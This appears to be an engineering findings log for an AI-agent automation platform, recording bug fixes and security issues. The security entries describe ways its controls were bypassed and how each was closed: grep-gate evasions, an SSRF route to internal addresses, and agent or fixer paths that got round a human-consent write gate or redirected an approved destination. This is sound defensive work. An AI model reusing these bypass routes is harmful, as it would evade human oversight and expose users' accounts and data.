  breakpoint on multi-turn chat runs (reproduced deterministically on the integration-build
  handoff two-turn handshake). The OAuth beta endpoint 400s
  `messages.N.content.M.text: cache_control cannot be set for empty text blocks`, killing the whole
  turn - so the integration-builder generation failed every time while plain builds and single-turn
  chat were unaffected. Fixed at the egress chokepoint (`proxyGatewayMessages`, the last place we
  control before the provider): `stripEmptyTextBlocks` scrubs empty text blocks out of the
  forwarded `messages`/`system`, guarded so a message is never left with an empty `content: []`.
  Covered by `api/tests/llm/gateway-payload-allowlist.test.ts` (3 cases: scrub-alongside-real,
  never-empty-the-array, plain-string-passthrough). Live-verified: the same handoff that 400'd now
  reaches `package-ready` with a Save button. Decision logged in `docs/decisions.md`.
- **`run-activity-bar-word-wrap`** (vision-discovered, walkthrough 2026-07-11) - the automation
  rehearsal activity bar rendered the fixer commentary one-word-per-line: `Headline`/`Subline`/
  `ResolutionLine` sat as siblings in the flex-row `BarWrapper`, so a long failure message squeezed
  the headline to content-width. Fixed by wrapping the text block in a `min-w-0 flex-1` column in
  the `fixing-step` and `running-step` branches (`web/components/automations/run-activity-bar.tsx`).
  Evidence: walkthrough `stabilization-verification/2026-07-11_11-26-17` (pre-fix state on camera).
- **`chat-turn-no-progress-indicator`** (vision-discovered, walkthrough 2026-07-11) - plain chat
  turns showed NO indicator between send and the first streamed chunk (the whole knowledge-search
  phase was a blank screen): the progress indicator required `sessionJob`, which only build
  sessions have. Fixed: `isExecuting && (sessionJob || !isBuildSession)`
  (`web/components/builder/chat-panel.tsx`), so chat turns show "A pensar..." + elapsed time
  immediately. Evidence: walkthrough `2026-07-11_11-44-28` (blank) vs `2026-07-11_11-49-20` (fixed).
- **`automation-step-events-thin`** (operator-reported, 2026-07-11) - a regression vs old cortex: the
  automation run's `step` SSE event dropped everything but `{runId, stepIndex, status}`, so per-step
  screenshots captured + persisted server-side (`writeStepScreenshot`) never reached the run viewer,
  and there was NO `express.static('/automation-screenshots', ...)` mount - even the already-emitted
  `pause_for_user` screenshot URL 404'd. Fixed by (a) extending the shared `AutomationRunEvent.step`
  member + `RunRecord` with the optional enrichment (`stepId/tier/error/errorDetails/screenshotUrl/
  output/durationMs`; `errorDetails` is the executor's already-redacted+bounded integration/api
  request-response that lights up the live IntegrationErrorPanel; per-step `RunStepRecord` with a
  served `screenshotUrl`), (b) a pure, unit-tested
  mapper `automationStepEventPayload` (api/src/automation/run-events.ts) the composition-root emitter
  now forwards, (c) mounting `/automation-screenshots` on `automationRunsRoot()` mirroring the
  `/artifact-screenshots` precedent, and (d) serializing steps (with `screenshotUrl`) in `toWireRun`
  so `GET /runs/:id` + the Histórico drill-in render thumbnails without knowing the disk layout. The
  disk-path -> served-URL map lives in ONE helper (`screenshotUrlFromPath`). Covered by
  `api/tests/automation/run-events.test.ts`, `api/tests/contract/automation-screenshots.test.ts`, and
  shared `contract.test.ts` (thin+enriched parse). Decision logged in `docs/decisions.md`. Remaining
  for live verification: a real automation run driven end-to-end (operator session).
- **`automation-vision-empty-screenshot`** (operator-reported, 2026-07-11) - a browser/verify step
  could hand the vision tier an EMPTY screenshot (a `page.screenshot()` that failed on the local
  session, or a daemon observation envelope missing `screenshotB64`); the model then answered
  `confidence:'low'` and the engine refused ("No screenshot was provided"), burning the fixer budget
  blind and crippling self-recovery. Fixed with a guard (`screenshotForVision` in engine.ts): on an
  empty capture, force ONE fresh `observe()` and re-read; if still empty, fail the step RECOVERABLE
  with a user-grade PT message ("captura de ecrã indisponível - o passo não pode ser resolvido
  visualmente") so the fixer/pause machinery handles it - the model is never asked to work blind.
  Belt-and-braces: `LocalBrowserSession.capture()` now retries the screenshot once after a settle and
  only keeps a NON-EMPTY capture; `resolvePlaywrightAction`/`verifyOutcome` throw on an empty image
  (documents the invariant). Covered by two `api/tests/automation/engine.test.ts` cases (browser +
  verify: no blind vision call, recoverable PT failure). LIVE-VERIFIED 2026-07-11 (DRE-search
  automation): per-step screenshots stream into the run viewer AND the Histórico drill-in; step
  screenshots serve 200 at `/automation-screenshots/<automationId>/<runId>/step-N.png`; the run
  completed with no blind-refusal. One more display fix made during that run: the verify-failure
  prefix was still English (`outcome not met:`) - now PT (`resultado não atingido:`) in
  `engine.ts` (the one test asserting the prefix updated).
- **`automation-run-surfaces-word-wrap`** (operator-reported, 2026-07-11) - extends
  `run-activity-bar-word-wrap` to the terminal states + the run viewer: the completed/failed activity
  bar and the run-viewer run-level + per-step error surfaces rendered long unformatted text that
  ballooned the layout. Fixed with `min-w-0 break-words` + `line-clamp` (2-3 lines, full text on
  `title`) on the completed/failed `Headline` detail (`run-activity-bar.tsx`) and the error blocks
  (`run-viewer.tsx`). Also: the vision resolver/verifier/fixer/classifier prompts now instruct the
  model to write human-facing free-text (reasoning, userInstructions) in pt-PT while keeping all JSON
  keys/enums in English.

- **`apps-embed-frame-headers`** - the `/apps/*` embed surface now answers CSP
  `frame-ancestors 'self'` + the configured dashboard origins (`EKOA_DASHBOARD_ORIGINS` csv ->
  `EKOA_APP_ORIGIN` -> dev localhost:3000; invalid entries dropped) with NO `X-Frame-Options`;
  the dashboard CSP gained `frame-src`/`img-src` for the api origin. The preview iframe renders
  live and is pinned by e2e. Other planes unchanged (API `'none'`+DENY, served `'self'`+SAMEORIGIN).
- **`registo-targetIds`** - `registoEntry.targetIds` emitted the metadata object where the schema
  wants `array(Id)`, failing `RegistoListResponse` validation; now derives ids from id-keyed metadata.
  Verified live.
- **`/users` + `/usage` crashes** - undefined `.toLocaleString()`; `adminListUsage` now left-joins
  users and emits the full gauge surface, `fmtTokens` on totals.
- **integrations page crash** - the session stub now answers `sessionConnect` + `actions`
  (`SessionCaptureStatus` carries both).
- **artifact versions 500** - `readVersions` graceful dual-jail for never-built artifacts and the
  featured list. (Featured-artifact `restoreVersion` remains open - see `restoreVersion-featured-500`.)
- **`knowledge.listUploads`** `_id`->`id`; **`ekoaLocal.llmModels`** `{data}` envelope; **servedApp**
  `appDataList`/`appSharedList` envelope - contract fold-ins.
- **artifact thumbnails** - previously unimplemented; now end-to-end (build-mechanics screenshot seam,
  `/artifact-screenshots` static mount, `Artifact.screenshotUrl`, dev CSP `img-src`).
- **automations planner failures** - TRUE ROOT CAUSE: the SDK option was `customSystemPrompt`, ignored
  by Agent SDK 0.2.118 (the option is `systemPrompt`), so EVERY system prompt was silently dropped on
  the live path - the planner never saw the required JSON shape. Fixed, plus `runOneShot` `maxTurns`
  1->3 for thinking-heavy EXPERT one-shots, plus a distinct `plan_unavailable` wire status for egress
  outages (never "reformule o objetivo" for a dead transport).
- **brand research not persisting** - the agent now emits a structured `BrandResearchResult` that is
  merge-written onto `org.branding`.
- **gateway always-FAST clamp** - amended: a request whose model matches one of the three configured
  tier models now runs AND meters at that tier (EXPERT ~20x FAST cost - deliberate); other models keep
  the FAST clamp. This un-starved the strict-JSON EXPERT planner and thinking-heavy builds.
- **`<ekoa-context>` reinjection** - the persisted context block was never re-injected on the next
  turn; now re-injected (`agents/context.ts`).
- **thinking channel** (2026-07-10) - intermediate commentary self-identifying as the engine briefly
  flashed unredacted; now a first-class `thinking_chunk` channel, server-side branding-redacted, and
  `result.text` is answer-only (which also fixed the persisted-answer contamination).

## Previously fixed - rc-1 release hardening + batch-final (2026-07-08..10)

All fixed-verified with committed tests: **F1** (auth lifecycle - refresh/logout/password/device +
jti revoke), **F2** (credential provisioning + live turn), **F3** (Registo CRUD/login/build write
coverage, metadata-only, org-scoped), **F4** (branding research + `PUT /branding` alias), **F5**
(UI-called endpoints mounted + mount-coverage drift gate), **F6** (terminal JSON-envelope 404),
**F7** (honest failed-build serving state + `Job.error`), **F10** (per-org deny-list resolver wired +
org-admin CRUD + live masking proof), **F11** (session rename `name`/`title` + `createdAt`/`updatedAt`),
**F13** (stale `credentials.ts` header), **F16/F28** (build served the untouched scaffold and verify
passed it - `BUILD_UNFULFILLED`/`VERIFY_FAILED` terminals + live J3 re-proof), **F20** (chat result
truncation - persisted == concatenated chunks), **F21** (memory recall injection wired + backfilled
test), **F22** (`memoryView` omitted `orgId`/`tags` - `/memory` rendered 0 cards), **F23** (7 console
errors on `/memory`), **F25** (host-context bleed - mechanism reproduced, hardened, accepted residual
documented), **F26** (de-anon round-trip broken by model whitespace reformatting - format-tolerant
detokenizer + 13k-case security property), **F29** (automation plan-from-goal 500 -> structured
`plan_failed` 200). **F19** was a verified billing PASS (no fix).

## Accepted / by-design / won't-fix

- **collections-engine access rules defined-not-enforced** (tracked `docs/decisions.md` 2026-07-07).
  The per-collection `access`/`declaredOnly`/field/size rules are defined in
  `data/collections-engine.ts` but not threaded end-to-end: no producer (app manifest) declares
  `collections`, so the plane runs at the safe default (schemaless, 256 KiB, app-scope). Not
  exploitable. Close both halves together when a producer lands: wire the manifest's `collections`
  block onto `artifact.collections` AND thread the resolved rule into the engine + gate `access`
  levels in `served-data.ts`.
- **served-app per-app data plane open posture** (by-design). `/api/app-data` is unauthenticated app-
  global storage scoped only by `X-Ekoa-App-Id`, carried verbatim for byte-compatibility; private data
  belongs on the server-authenticated shared/JWT/SSO planes. Documented in `docs/security.md`.
- **`docx-clean-drops-comments`** (accepted, kept deliberately; found by the 2C-S7 docx gate,
  2026-07-25). `POST /api/app-docx/clean` (`document-source.getClean` ->
  `docx-redline.acceptAllRevisions`) returns a document with NO comments: @adeu/core 1.28.0's
  `accept_all_revisions` strips `word/comments.xml`, `commentsExtended.xml`, `commentsIds.xml`,
  `commentsExtensible.xml` AND the in-document `commentRangeStart/End/Reference` anchors. **Word
  itself keeps comments when you accept all changes**, and ekoa-dev's `word-track-changes.md`
  asserted comments survive - that claim was never tested (dev's `acceptAllRevisions` is
  byte-identical to ours and its test only checked for the absence of `w:ins`/`w:del`), so the port
  inherited a false doc, not a regression. KEPT rather than worked around: the clean copy is the
  "final version to send out", and shipping internal review notes to a counterparty is a real legal
  risk. The WORKING copy (`GET /api/app-docx/current`) is unaffected and carries everything. Pinned
  as a tripwire in `api/tests/apps/docx-word-gate.test.ts` (a future engine bump or a deliberate fix
  turns it red, so the lawyer-facing download can never change silently) and documented in
  `docs/word-track-changes.md` §2.4 + the `getClean` header.
- **subprocess PATH home-path residual** (by-design). The agent subprocess inherits the operator's
  home on `PATH`; accepted residual from the F25 hardening (disposition doc committed).
- **`sweepOrphans` boot-recovery gap** (accepted). Boot-time crash recovery flips orphaned jobs to
  `failed{ORPHANED}` without a Registo row; guaranteed-once holds on the normal live path.
- **F9** (won't-fix-minor). Trigger disable (410) is unreachable over the API (delete-only lifecycle).
- **F24** (won't-fix-minor). Extraction can persist a markdown-only junk memory (`**`).
- **F27** (won't-fix-minor). `GET /registo?type=anonymisation` returns 0 rows - filter-granularity
  confusion (the qualified query returns all rows); not a missing row.
- **F30** (won't-fix-minor). Builds do not emit a `memory-extract` billing row (build post-run
  extraction differs from the chat path).
- **served-app assistant "Fontes" can contradict the reply** (open; found by D2 fresh review, 2026-07-13; CONFIRMED harder by D3 live evidence: 5 authoritative-looking Acórdão citations rendered directly under an explicit "não posso responder" refusal — slices/D3 live-04-fontes.png of run 20260712-150958-4bb23640).
  `runAppAssistant` returns ALL grounding hits as citations (`api/src/apps/app-assistant.ts`
  `grounding.citations`), not the sources the model actually used - the live D2 evidence shows a
  reply saying the excerpts were not used while five "Fontes" render under it. Trust-eroding for a
  cite-your-source legal product. Candidate fix: emit only reply-referenced citations, or suppress
  the list when the model states it grounded on nothing. Owner: D3/F-slice follow-up on the
  operator-run branch (or platform, whichever lands first).
- **served-app anonymous `whoami` logs a console 401** (open platform nit, surfaced by the D2 strict
  console gate, 2026-07-13). `injected-context.ts:110` fetches `/api/app-sso/me`; for an anonymous
  visitor it 401s and the browser logs the failed resource on EVERY served app load. Candidate fix:
  200 `{user:null}` for anonymous (contract response is `z.unknown()`, additive). Until fixed, the
  D2 e2e allowlists exactly this signature (documented in `api/tests/e2e/assistant-panel.e2e.mjs`).
- **served-app health beacon 502 through the dev proxy** (open platform nit, surfaced by the D2
  strict console gate, 2026-07-13). `injected-context.ts:244` POSTs `/api/app-health`; through the
  dev proxy (:4111) it 502s and logs a console error on load. Likely a dev-proxy forwarding gap
  (relates to d55bd02). Prod path unverified. Allowlisted (documented) in the D2 e2e only.

## F-2026-07-18-invalid-date-cards (open, cosmetic)
Artifact cards on /artifacts render "Invalid Date" for dev-seeded artifacts whose createdAt is
empty (visible in the OS-mode walkthrough, classic beats). Real user-created artifacts carry
timestamps; the fix is either seeding createdAt in the dev fixtures or formatDate falling back
to a dash for missing dates. Surfaced by the walkthrough vision pass; needs a deterministic
close (unit on formatDate fallback) or a written dismissal.

## F-2026-08-03-chokepoint-gate-bypasses (FIXED)

The chokepoint grep gate (`scripts/chokepoint-grep.sh`, `npm run gate:chokepoint`, in CI) was
bypassable four ways after the widening recorded above. A fresh-context verifier reproduced each by
running the real script; each was re-reproduced before the fix and re-run after. All four are closed
and pinned by `api/tests/security/grep-gates.test.ts`, which executes the REAL script against
planted violations. Revert-verified: five scripted reversions, each turning the matching case red.

- **`chokepoint-marker-smuggled-into-a-path`** (FIXED 2026-08-03, CRITICAL, gate bypass). The
  allow-marker was filtered with `grep -v 'chokepoint-gate-allow'` over the whole
  `path:line:content` output line, so the marker matched in the PATH as well as the content:
  `api/tests/chokepoint-gate-allow/p.ts` (a DIRECTORY) or `api/tests/x/chokepoint-gate-allow.ts` (a
  FILE) exempted itself, and a directory exempted an unbounded subtree. That defeated both
  properties the marker was introduced with: exemption is one LINE, and `grep -rn` over content
  enumerates every exemption. FIXED: an awk filter splits `path:line:content` and matches the marker
  against the CONTENT ONLY (path exemptions are matched against the PATH field, anchored). Pinned by
  "the allow-marker cannot be smuggled into a DIRECTORY name" / "... into a FILE name".

- **`chokepoint-gate-was-case-sensitive`** (FIXED 2026-08-03, CRITICAL, gate bypass). The needle had
  no `-i` while the script's own comment claimed "case-insensitive", so
  `https://api.Anthropic.com/v1/messages` passed the gate. DNS is case-insensitive, so that URL
  resolves and works: exactly the raw-fetch class the gate exists to catch. `'@ANTHROPIC-ai/sdk'`
  and `'ANTHROPIC.COM'` passed too. Worse, the two exemption filters used `-iv`, so the
  case-insensitivity was on the WRONG side of the fence: `api/src/LLM/` and `api/tests/LLM/`
  inherited the chokepoint module's exemption. FIXED by splitting the gate into the two passes its
  comment always claimed: PASS 1 matches the banned references themselves (`@anthropic-ai`,
  `anthropic.com`) CASE-INSENSITIVELY over every root; PASS 2 is the broad lowercase `anthropic`
  token as a split-string net. The path exemptions are now case-SENSITIVE and anchored. Pinned by
  "an UPPER-CASE provider host fails", "an UPPER-CASE package scope and a bare upper-case host both
  fail", and "the PATH exemptions are case-SENSITIVE".

  KNOWN RESIDUAL, accepted deliberately: pass 2 stays case-SENSITIVE. The word legitimately appears
  ~40 times outside `api/src/llm/` in two shapes that are not egress and cannot be removed - the
  capitalised proper noun in doc comments and UI copy ("Anthropic-compatible clients", including
  `shared/`, `server.ts` and the locales), and the SCREAMING_SNAKE env identifiers
  `ANTHROPIC_BASE_URL` / `ANTHROPIC_AUTH_TOKEN` / `ANTHROPIC_API_KEY`, of which `ANTHROPIC_BASE_URL`
  is the mechanism CLAUDE.md MANDATES for pointing a subprocess AT the chokepoint. A case-insensitive
  pass 2 would mean ~40 line markers, turning the marker into furniture and destroying the property
  that `grep -rn chokepoint-gate-allow` is a short readable enumeration. The cost is that a literal
  that is BOTH split AND mixed-case (`'api.' + 'Anthropic' + '.com'`) evades both passes; so does
  charcode obfuscation, which no grep gate can see. The ESLint import ban and review are the other
  layers. Pinned in the other direction too ("the sanctioned wiring identifier and prose do NOT trip
  it"), so a future widening has to confront the trade-off rather than discover it.

- **`chokepoint-gate-scanned-a-root-that-does-not-exist`** (FIXED 2026-08-03, HIGH, gate coverage).
  The script scanned `web/src`, WHICH IS NOT A DIRECTORY (the real roots are `web/app`, `web/lib`,
  `web/components`, `web/stores`, `web/hooks`, `web/locales`, `web/types`, plus `web/e2e`,
  `web/__tests__`, `web/scripts`), while the comment the previous commit wrote claimed "so a raw
  provider reference cannot hide in the frontend". Probes planted in `web/lib/` and `web/app/` both
  passed. `scripts/`, `api/scripts`, `api/assets` (first-party served runtime bundles) and
  `clients/` (a SHIPPED CLI workspace) were unscanned too. FIXED: the root list is now every
  first-party source root, and - the actual root cause - A DECLARED ROOT THAT IS NOT A DIRECTORY NOW
  FAILS THE GATE. A missing root used to be scanned as empty, i.e. reported clean; that is how
  `web/src` hid the whole frontend for as long as it did. Widening surfaced 5 new hits, all in web
  and all triaged as anti-leak enforcement (the token is the needle of a check that the name is
  ABSENT): `web/lib/sanitize-error.ts` (the provider-leak denylist), `web/e2e/chat-thinking.spec.ts`
  (x2), `web/__tests__/sanitize-error.test.ts`, `web/__tests__/components/thinking-block.test.tsx`.
  Each got a same-line marker; no real violation was found and nothing was weakened to make it pass.
  Pinned by "EVERY declared root is really scanned" (one probe per root), "a violation in the
  FRONTEND, in scripts/ and in the shipped clients/ CLI fails on the real tree", "a DECLARED ROOT
  THAT DOES NOT EXIST fails the gate" and "every declared root really exists in the repo".

- **`ekoa-llm-direct-really-does-bypass-the-chokepoint`** (RECORDED 2026-08-03, MEDIUM, honest
  labelling - NOT a shipped bypass, behaviour deliberately unchanged). `api/tests/journeys/boot-b.mjs`
  justified its allow-marker by claiming `LLM_CHOKEPOINT_BASE_URL` is "the CHOKEPOINT'S OWN
  destination ... never a route around it". That is FALSE, and the finding above repeats it.
  `api/src/config.ts:297` feeds the variable to `llm/credentials.ts:isLocalGatewayChokepoint()`,
  which is true ONLY for a loopback host; pointed at the provider it is false, so
  `buildSubprocessEnv` (`llm/credentials.ts:387,395`) stops injecting the boot-provisioned GATEWAY
  key and injects the REAL MODEL CREDENTIAL (`CLAUDE_CODE_OAUTH_TOKEN` / `ANTHROPIC_API_KEY` = the
  secret), and sets the subprocess's `ANTHROPIC_BASE_URL` to the provider. `EKOA_LLM_DIRECT=1`
  therefore spawns SDK subprocesses pointed straight at the provider carrying the model secret: no
  gateway, no anonymisation pipeline, no attribution or metering - verbatim what CLAUDE.md's
  egress-chokepoint rule forbids. It is NOT a shipped bypass: opt-in, default off, in a dev journey
  harness product code never imports, set by no CI lane (`grep -rn EKOA_LLM_DIRECT`), and its one
  use is watching live token streaming that the gateway path buffers by design. Its BEHAVIOUR is
  deliberately unchanged; what changed is that the comment now says what it does, at both marker
  sites, and it is recorded here so it is discoverable rather than buried in a marker. If the dev
  need for live streaming is ever solved on the gateway path, delete the flag.

## F-2026-08-03-ungated-write-rails (C2 follow-up; four FIXED, one OPEN)

The C2 fresh-context reviewer confirmed the Action write gate is solid on the rail it covers, then
enumerated five more surfaces that reach the same effect with no gate at all. Four are closed here;
the fifth is recorded OPEN because the complete fix belongs in a file this slice does not own.

- **`platform-actions-were-completely-ungated`** (FIXED 2026-08-03, CRITICAL, unapproved writes on
  the org's managed OAuth connection). `google-workspace` / `microsoft-365` short-circuit to
  `callPlatformIntegration`, from `automation/engine.ts` (the `integration` step), the artifact
  `integration.call` primitive, the listener supervisor's poll, chat prefetch and email hydration.
  None of those paths consulted any approval, so RUN_SPEC criterion 6 - "a write requires human
  confirmation" - was simply FALSE for the mailbox, calendar, Drive and OneDrive of every connected
  org: 14 mutating Google actions (`send_email`, `send_email_simple`, `create_event`,
  `update_event`, `delete_event`, `create_doc`, `write_doc`, `create_sheet`, `append_sheet`,
  `modify_email`, `batch_modify_emails`, `trash_email`, `create_task`, `complete_task`) and 3
  Microsoft ones (`send_email`, `create_event`, `create_file`), executable with zero confirmation by
  any org member who could drive an automation or an artifact. FIXED by enforcing C2's
  `checkActionConsent` inside `callPlatformIntegration` itself, keyed on a build-time allowlist of
  READ actions that must AGREE with the definition's `mutates` (decisions.md 2026-08-03), before any
  OAuth token is read. Pinned by `api/tests/security/platform-write-gate.test.ts` (19 cases:
  allowlist-vs-shipped-package drift in both directions, fail-closed on unknown key/action/`mutates`,
  refusal with no provider call, cross-org / cross-user / cross-action / TTL non-transferability,
  reads still auto-running) and `api/tests/automation/platform-primitive-write-gate.test.ts` (the
  artifact rail through the real seam body, plus the composition-root wiring guards).

- **`api-call-steps-were-a-fifth-write-rail`** (FIXED 2026-08-03, HIGH, gate bypass by step type).
  `automation/executors/api-call.ts` performed any HTTP method with `authIntegrationKey` credentials
  injected and no consent check, so an agent refused at the Action gate could author the same write
  as a step one type over. FIXED: a non-idempotent method (anything outside `GET`/`HEAD`/`OPTIONS`,
  and an absent/unrecognised method) now needs a human, checked BEFORE the credential load so an
  unapproved write never decrypts a secret, through the automation tier's existing consent module
  (decisions.md 2026-08-03 for why not C2's store). Pinned by
  `api/tests/security/api-call-write-gate.test.ts` (12 cases incl. "no credential read on refusal",
  shape drift on url/body/header/method/credential/bodyKind, cross-user, cross-org, once-vs-always).
  BEHAVIOUR CHANGE, deliberate: an existing automation with a POST/PUT/PATCH/DELETE `api_call` step
  now asks once per shape - dialog on an attended run, refusal on an unattended one - instead of
  running silently.

- **`awaiting-consent-was-not-a-pause-and-the-fixer-could-rewrite-around-it`** (FIXED 2026-08-03,
  HIGH). `engine.ts` paused only on `recoverable === false`, and the consent refusal's message does
  not match `/not connected/i`, so an unapproved write ended the run as `failed` (a state a caller
  retries) rather than as something a human is asked to answer. On the step types the fixer does
  handle it was worse: `rehearsal.ts` let `replace_current` substitute an arbitrary `Step`,
  INCLUDING an `api_call` performing the same write with no gate - the machinery meant to repair a
  run could route around the gate that stopped it. FIXED in three places: both integration rails now
  carry the executor's CODE on `details` (the composition root's platform binding previously dropped
  it) and the engine classes the refusal structurally, not by prose; both refusals are
  non-recoverable so `shouldAttemptFix` never invites the fixer; and the fixer's step vocabulary is
  narrowed to the four types `FIXER_SYSTEM` actually documents. Pinned by the write-rail block in
  `api/tests/automation/engine.test.ts` and the vocabulary block in
  `api/tests/automation/rehearsal.test.ts` (incl. "an effect payload cannot ride along on an
  accepted step type").

- **`builder-test-endpoint-was-an-unguarded-egress`** (FIXED 2026-08-03, HIGH, SSRF). 
  `POST /api/v1/integration-builder/test` ran a model-authored `httpConfig` on a BARE `fetch` while
  its own docblock claimed it matched the action executor's `guardedFetch` posture. Any
  authenticated user could point it at `http://169.254.169.254/`, loopback, or any RFC1918 address
  the API host can reach. FIXED with `guardedFetch` + the no-echo refusal, no transport seam and no
  environment exemption. Pinned by `api/tests/security/builder-test-ssrf.test.ts` (8 cases against
  the route's real default). The WRITE-GATE half was deliberately not applied - see decisions.md
  2026-08-03 for the argument (synchronous human caller, own session, caller-supplied credentials,
  nothing stored spent; and gating an unsaved session package would be a ban, not a gate).

- **`consent-target-shows-an-uninterpolated-template-and-config-can-redirect-it`**
  (**FIXED 2026-08-04**, was MEDIUM, consent integrity - found by a live vision-driven run against a
  REAL third-party integration, not by a suite). Two halves of one problem, both reproduced end to
  end on the running stack with a real ntfy.sh account and a real gateway key.
  CLOSED by keying an approval on (org, user, integration, action, SHAPE, **DESTINATION**), where
  the destination is the RESOLVED target. It resolves from `publicConfigValues` - a plaintext
  projection of the values the definition's `configSchema` does NOT mark secret - so the gate still
  answers BEFORE any credential is decrypted and C2's ordering is intact; a secret in a destination
  renders as `••••` and is never resolved into a dialog. Deliberately NOT a hash of the credential
  blob: the envelope is non-deterministic, so that would make every routine OAuth refresh revoke
  every standing approval. `actionShape` is untouched, so D3's authoring/trust fingerprint keeps its
  meaning. Suite: `api/tests/security/consent-destination-binding.test.ts` (7 cases; removing the
  destination from the approval key was reverted-and-verified to turn the redirect case red).
  RE-VALIDATED LIVE after the fix: the dialog now shows
  `VAI EXECUTAR POST https://ntfy.sh/<real topic>`, moving the topic returns 403 `awaiting_consent`
  with the re-prompt naming the NEW destination and nothing published, and restoring the approved
  destination works again without re-approving.
  (a) THE DIALOG SHOWS A PLACEHOLDER. `actionTarget()` renders `httpConfig.baseUrl + path`
  VERBATIM, so for any action whose path is templated the human is asked to authorise
  `VAI EXECUTAR POST https://ntfy.sh/{{ntfy_topic}}`. C2's requirement is that the dialog names the
  real destination "not a paraphrase"; a raw placeholder is strictly less than a paraphrase. The
  shipped Slack package hides this because its baseUrl and path are both literal.
  (b) AND THE DESTINATION CAN MOVE UNDER A LIVE APPROVAL. `actionShape` fingerprints
  `(key, actionName, backing, transport, httpConfig, automationBinding)` - the TEMPLATE. Config
  VALUES are not in it. Reproduced: a human granted "Autorizar sempre" for the write; the config's
  `ntfy_topic` was then changed with `PATCH /api/v1/integrations/configs/ntfy` and NOTHING else;
  the same gateway key's next `achieve` call published to the NEW topic, HTTP 200, message
  confirmed landed on a destination the approver never saw. No re-prompt, because by the
  fingerprint nothing changed.
  SCOPE, honestly: the host cannot be moved this way - `baseUrl` is literal in the action and
  origin-binding would refuse a new host - so this redirects WITHIN an already-bound origin
  (path/query/body). And the principal who can edit the config is the credential owner, so this is
  not a peer-to-peer escalation. What it does break is the meaning of the consent record: "I
  authorised sending to X" silently becomes "sending to Y", which is exactly what the approval
  exists to pin. It also matters more after D3, since `achieve` makes the write rail reachable by a
  key whose holder is not the approver.
  CANDIDATE CLOSES (not attempted here): render the RESOLVED target in the dialog for non-secret
  config values and mark secret ones, or extend the fingerprint to cover the config values the
  template actually names, so moving one invalidates the approval the way editing the action does.
- **`authored-action-guardrails-cannot-prove-an-endpoint-exists`** (OPEN 2026-08-04, LOW, honest
  labelling - observed while validating D3's author arm against a REAL API with a real model).
  `achieve` was asked for "consultar as estatisticas do topico" on a live ntfy.sh integration. It
  authored `consultar_estatisticas_topico` -> `GET https://ntfy.sh/<topic>/stats`, and ALL EIGHT
  deterministic guardrails passed: shape, action_name, backing, transport, origin, placeholders,
  no_pasted_secret, render. The action was well-formed, on a bound host, naming only declared
  variables. It is also wrong: ntfy has no `/stats` endpoint, and once a human promoted it the call
  returned a real 404.
  NOT A DEFECT IN THE SUITE, and recorded so nobody reads a passing verification as more than it
  claims: every check is a property of the DRAFT, and none of them can know a remote API's route
  table without calling it - which the author arm must not do, since the call it would make is
  exactly the unapproved one. This is the argument FOR provisional-by-default rather than against
  it: the state machine exists because a draft can be perfectly formed and still not work, and the
  human promoting it is the first party in a position to notice.
  CANDIDATE CLOSE if it ever matters: surface the verification verdict in the promotion dialog
  alongside a one-click dry run of the drafted action, so the person promoting sees the real
  response before they take responsibility for it.
- **`action-shape-does-not-cover-browser-steps-content`** (OPEN 2026-08-03, HIGH, consent bound to a
  name rather than to a command). `actionShape` (integrations/action-consent.ts) hashes
  `automationBinding` - i.e. the automation's ID - and never the STEPS that automation runs.
  `provisionIntegrationAutomations` re-provisions the SAME deterministic org-scoped id from a
  refreshed template and rewrites `steps` in place, so a package bump changes WHAT EXECUTES while
  the human's approval still stands. That is exactly the "consent never approved the command called
  deploy" failure the module's own docblock invokes: it holds for `httpConfig`, and not for the
  automation backing. `bash-cli` is saved by the engine's separate `approved_commands` gate and, as
  of this slice, an `api_call` step inside a provisioned automation is gated too - so the residual is
  a swapped `browser`/`navigate`/`verify` sequence, which is precisely what a `browser-steps` action
  is made of. NOT FIXED HERE because the fix belongs in `action-consent.ts`, C2's file and read-only
  for this slice. THE FIX, precisely: make the bound automation's CONTENT part of the fingerprint -
  either hash the provisioned automation's canonical `steps` into `actionShape`'s tuple alongside
  `automationBinding` (needs the steps at gate time, i.e. a resolver the executor can call), or have
  the provisioner stamp a content digest onto `automationBinding` (`actionShape` already hashes the
  whole binding object, so the shape would follow with no change to the hash function at all). The
  second is additive and cheaper; both make a package bump re-prompt, which is the correct direction.

- **`no-wire-event-can-carry-a-pause-reason`** (OPEN 2026-08-03, LOW, honest labelling). A run that
  halts because an integration WRITE needs approval persists `status: 'awaiting_consent'` (correct,
  and what the run resource and Histórico show), but has no truthful terminal SSE frame: `paused`
  carries only `{ service }` (`shared/src/events.ts`) and the dashboard maps it to
  `awaiting_integration`, i.e. it would tell someone whose integration is connected and working to go
  connect it; `awaiting_consent` carries `{ stepIndex, shape, argv, description }`, a COMMAND
  consent whose "sempre" the dashboard answers into a store this gate does not read. The engine
  therefore emits `error` with the message that names the action, the destination and the fact that
  an approval is needed - true and actionable, at the cost of a live badge that reads "failed" while
  the record reads `awaiting_consent`. THE FIX: `paused` gains an optional `reason` (additive under
  Rule 7), the dashboard renders `awaiting_consent` distinctly and links to the integration's
  action-approvals surface. Not done here: `shared/` is slice D1's live surface this wave.

- **`module-level-regex-from-an-imported-const-silently-misbuilds-in-the-integrations-cycle`**
  (OPEN 2026-08-03, HIGH latent, correctness - found by slice E2 while building `publish-scrub.ts`).
  `api/src/integrations/` contains a live import cycle: `definitions -> service -> credential-cofre
  -> definition-registry -> publish-scrub -> definitions`. Inside a cycle, a module-level
  `new RegExp(SOME_IMPORTED_CONST)` evaluates while the imported binding is still in its temporal
  dead zone / undefined, so the pattern is built from the WRONG source and compiles silently. E2 hit
  this for real: the placeholder branch of its credential pattern never matched, which made the
  publish floor redact EVERY SHIPPED AUTH HEADER — i.e. published integrations would have gone out
  with `[REDACTED]` where their `Authorization` template belonged. It failed silently at every level
  except one: the shipped-package identity property test (the A3 determinism ratchet) was the only
  thing that caught it. Fixed in E2 by building the regex LAZILY. THE FINDING IS NOT E2's BUG - it is
  that the hazard is invisible and repeatable: any future module-level use of an imported binding
  anywhere in that cycle can misbuild the same way. Close by breaking the cycle, or by a lint rule
  banning module-level `new RegExp(<imported>)` in `api/src/integrations/**`. Logged by the
  orchestrator because E2 correctly reported it rather than editing a file outside its ownership.
